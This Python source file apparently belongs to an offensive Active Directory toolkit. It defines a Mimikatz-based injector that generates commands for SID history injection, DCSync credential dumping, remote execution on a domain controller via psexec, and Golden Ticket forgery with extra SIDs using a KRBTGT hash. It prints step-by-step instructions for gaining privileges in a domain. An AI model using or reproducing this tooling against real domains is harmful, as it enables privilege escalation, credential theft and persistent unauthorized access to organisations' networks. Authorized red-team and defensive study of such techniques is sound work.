"""
Mimikatz SID History Injector
Inject SID history using Mimikatz sid::add module
"""

import shutil
from typing import Optional, List
from pathlib import Path

from .base import BaseInjector
from ..models import InjectionOperation, InjectionStatus


class MimikatzInjector(BaseInjector):
    """
    Inject SID history using Mimikatz

    Requirements:
    - Domain Admin on target domain
    - Mimikatz.exe available
    - Running on DC or with DCSync rights
    """

    def __init__(self, output_dir: str = "sid_history", verbose: bool = True):
        """
        Initialize Mimikatz injector

        Args:
            output_dir: Directory for output files
            verbose: Print status messages
        """
        super().__init__(output_dir, verbose)
        self.mimikatz_path = "mimikatz.exe"

    def is_available(self) -> bool:
        """Check if Mimikatz is available"""
        # Mimikatz usually needs to be in current dir or PATH
        return shutil.which(self.mimikatz_path) is not None or Path(self.mimikatz_path).exists()

    def generate_commands(self, operation: InjectionOperation) -> List[str]:
        """
        Generate Mimikatz commands for SID injection

        Args:
            operation: InjectionOperation with details

        Returns:
            List of Mimikatz commands
        """
        commands = [
            "# Mimikatz SID History Injection",
            "# Requires Domain Admin privileges",
            "",
            "# Enable debug privileges",
            "privilege::debug",
            "",
            "# Optional: DCSync to verify access",
            f"lsadump::dcsync /domain:{operation.target_domain} /user:{operation.target_user}",
            "",
            "# Inject SID into user's SID History",
            f"sid::add /sam:{operation.target_user} /new:{operation.sid_to_inject}",
            "",
            "# Verify injection",
            f"lsadump::dcsync /domain:{operation.target_domain} /user:{operation.target_user}",
        ]

        return commands

    def generate_remote_commands(
            self,
            operation: InjectionOperation,
            dc_ip: str
    ) -> List[str]:
        """
        Generate Mimikatz commands for remote injection via DCSync

        Args:
            operation: InjectionOperation
            dc_ip: Domain controller IP

        Returns:
            List of commands
        """
        commands = [
            "# Mimikatz Remote SID History Injection via DCSync",
            "",
            "# Enable debug privileges",
            "privilege::debug",
            "",
            "# Perform DCSync to get user info",
            f"lsadump::dcsync /domain:{operation.target_domain} /dc:{dc_ip} /user:{operation.target_user}",
            "",
            "# NOTE: sid::add requires local execution on DC",
            "# Use PSExec or similar to run Mimikatz on DC:",
            f"# psexec.exe \\\\{dc_ip} -s mimikatz.exe",
            "",
            "# Then run:",
            "privilege::debug",
            f"sid::add /sam:{operation.target_user} /new:{operation.sid_to_inject}",
        ]

        return commands

    def inject(self, operation: InjectionOperation) -> bool:
        """
        Perform SID history injection using Mimikatz

        Note: Due to the sensitive nature and manual requirements,
        this generates commands rather than auto-executing

        Args:
            operation: InjectionOperation

        Returns:
            True if commands generated successfully
        """
        self.log(f"Preparing Mimikatz SID injection for: {operation.target_user}")
        self.log(f"SID to inject: {operation.sid_to_inject}")
        self.log(f"SID description: {operation.sid_description}")

        operation.mark_started()

        # Generate commands
        if operation.dc_ip:
            commands = self.generate_remote_commands(operation, operation.dc_ip)
        else:
            commands = self.generate_commands(operation)

        # Save commands
        self.save_commands(operation, commands)

        # Print manual execution instructions
        self._print_manual_instructions(operation)

        # Mark as pending (requires manual execution)
        operation.status = InjectionStatus.PENDING

        return True

    def _print_manual_instructions(self, operation: InjectionOperation) -> None:
        """Print manual execution instructions"""
        print(f"\n" + "=" * 60)
        print("MIMIKATZ SID HISTORY INJECTION")
        print("=" * 60)

        print(f"\n[!] Manual execution required!")
        print(f"\n[*] Target: {operation.target_user}@{operation.target_domain}")
        print(f"[*] SID to inject: {operation.sid_to_inject}")
        print(f"[*] This grants: {operation.sid_description}")

        print(f"\n[*] Prerequisites:")
        print(f"    1. Domain Admin on {operation.target_domain}")
        print(f"    2. Access to Domain Controller")
        print(f"    3. Mimikatz.exe")

        print(f"\n[*] Steps:")
        print(f"    1. Get shell on DC (PSExec, RDP, WMI)")
        print(f"    2. Run Mimikatz as SYSTEM")
        print(f"    3. Execute commands from: {operation.output_file}")
        print(f"    4. Log out/in as {operation.target_user}")
        print(f"    5. User now has {operation.sid_description} privileges!")

        print(f"\n[*] Commands saved to: {operation.output_file}")

    def generate_golden_ticket_injection(
            self,
            operation: InjectionOperation,
            krbtgt_hash: str,
            domain_sid: str
    ) -> List[str]:
        """
        Generate commands for Golden Ticket with SID History (ExtraSids)

        This is an alternative to direct SID injection that uses
        Kerberos ticket forgery

        Args:
            operation: InjectionOperation
            krbtgt_hash: KRBTGT NTLM hash
            domain_sid: Current domain SID

        Returns:
            List of Mimikatz commands
        """
        commands = [
            "# Golden Ticket with ExtraSids (SID History)",
            "# This forges a ticket with arbitrary SID History",
            "",
            "privilege::debug",
            "",
            "# Forge Golden Ticket with SID in sids parameter",
            f"kerberos::golden /user:{operation.target_user} "
            f"/domain:{operation.target_domain} "
            f"/sid:{domain_sid} "
            f"/krbtgt:{krbtgt_hash} "
            f"/sids:{operation.sid_to_inject} "
            f"/ptt",
            "",
            "# Verify ticket loaded",
            "kerberos::list",
            "",
            "# Access parent domain resources",
            "# dir \\\\parent-dc\\c$",
        ]

        return commands